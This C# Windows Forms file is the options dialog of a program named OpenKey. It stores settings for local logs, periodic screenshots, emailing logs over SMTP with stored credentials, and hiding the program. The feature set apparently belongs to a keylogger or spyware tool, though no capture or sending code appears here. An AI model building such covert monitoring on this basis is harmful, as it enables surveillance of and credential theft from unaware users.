using System;
using System.Windows.Forms;

namespace OpenKey
{
    public partial class Opciones : Form
    {
        bool Cargar;
        public Opciones(bool cargar)
        {
            Cargar = cargar;
            InitializeComponent();
        }

        private void Opciones_Load(object sender, EventArgs e)
        {
           cmbregformat.Text= cmbregformat.Text = "txt";
            gshot.Enabled = false;
            gmail.Enabled = false;
            if (Cargar) Load_options();
        }

        void Load_options()
        {
            //Local
             location.Text=Global.Location;
          chkreglocal.Checked=  Global.chkreglocal ;
          namereglocal.Text = Global.Namereglocal;
          cmbregformat.Text = Global.Formatreglocal;
          nudreglocal.Value = Global.Nudreglocal;
          chksnaplocal.Checked = Global.chksnaplocal;
          nudsnaplocal.Value = Global.Nudsnaplocal;

            //Email
            chksendmail.Checked = Global.chksendmail;
            txtdestino.Text = Global.Destino;
            opc_origen1.Checked = opc_origen1.Checked = Global.radiorigen1;
            opc_origen2.Checked = opc_origen2.Checked = Global.radiorigen2;
            txt_email.Text = Global.Email;
            txt_clave.Text = Global.Pass;
            txt_smtp.Text = Global.Smtp;
            txt_smtpport.Text = Global.Port;
            chk_usessl.Checked = Global.SSL;
            timelog.Value = Global.NudLog;
            //Snapshot
            chksnapshot.Checked = Global.chksnapshot;
            nameshot.Text = Global.NameSnap;
            formatsnap.Text = Global.FormatSnap;
            timeSnap.Value = Global.NudSnap;
            //Settings
            chkhide.Checked = Global.Hide;
            chkkey.Checked = Global.chkkey;
            txtkey.Text =txtrkey.Text= Global.Password;
        }

        private void radioButton1_CheckedChanged(object sender, EventArgs e)
        {
            gorigen.Enabled = false;
        }

        private void radioButton2_CheckedChanged(object sender, EventArgs e)
        {
            gorigen.Enabled = true;
        }

        private void exit_Click(object sender, EventArgs e)
        {
            Close();
        }

        private void checkBox1_CheckedChanged(object sender, EventArgs e)
        {
            if (!chksendmail.Checked && chksnapshot.Checked) gshot.Enabled= false;
            else if (chksendmail.Checked && chksnapshot.Checked) gshot.Enabled = true;
            gmail.Enabled = chksnapshot.Enabled = chksendmail.Checked;

        }

        private void Examinar_Click(object sender, EventArgs e)
        {
            folderBrowserDialog1.ShowDialog();
            location.Text = folderBrowserDialog1.SelectedPath;
        }

        private void checkBox3_CheckedChanged(object sender, EventArgs e)
        {
            if (chksendmail.Checked)
            {
                if (chksnapshot.Checked)
                    gshot.Enabled = true;
                else
                {
                    gshot.Enabled = false;
                }
            }
        }

        private void chkreglocal_CheckedChanged(object sender, EventArgs e)
        {
            if (chkreglocal.Checked) grbregistrolocal.Enabled = true;
            else grbregistrolocal.Enabled = false;

        }

        private void save_Click(object sender, EventArgs e)
        {
            if (chkkey.Checked && (txtkey.Text == "" || txtkey.Text != txtrkey.Text))
            {
                MessageBox.Show("La clave es inválida", "Clave inválida", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            //Local
            Global.Location = location.Text;
            Global.chkreglocal = chkreglocal.Checked;
            Global.Namereglocal = namereglocal.Text;
            Global.Formatreglocal = cmbregformat.Text;
            Global.Nudreglocal = (int)nudreglocal.Value;

            Global.chksnaplocal = chksnaplocal.Checked;
            Global.Nudsnaplocal = (int)nudsnaplocal.Value;
            //Email
            Global.chksendmail = chksendmail.Checked;
            Global.Destino = txtdestino.Text;
            Global.radiorigen1 = opc_origen1.Checked;
            Global.radiorigen2 = opc_origen2.Checked;
            Global.Email = txt_email.Text;
            Global.Pass = txt_clave.Text;
            Global.Smtp = txt_smtp.Text;
            Global.Port = txt_smtpport.Text;
            Global.SSL = chk_usessl.Checked;
            Global.NudLog = (int)timelog.Value;
            //Snapshot
            Global.chksnapshot = chksnapshot.Checked;
            Global.NameSnap = nameshot.Text;
            Global.FormatSnap = formatsnap.Text;
            Global.NudSnap = (int)timeSnap.Value;
            //Settings
            Global.Hide = chkhide.Checked;
            Global.chkkey = chkkey.Checked;
            Global.Password = txtkey.Text;

            Global.Write();
            Close();
        }

        private void chkkey_CheckedChanged(object sender, EventArgs e)
        {
            zonekey.Enabled = chkkey.Checked;
        }

        private void chksnaplocal_CheckedChanged(object sender, EventArgs e)
        {
            if (chksnaplocal.Checked) grbsnapshotlocal.Enabled = true;
            else grbsnapshotlocal.Enabled = false;
        }
    }
}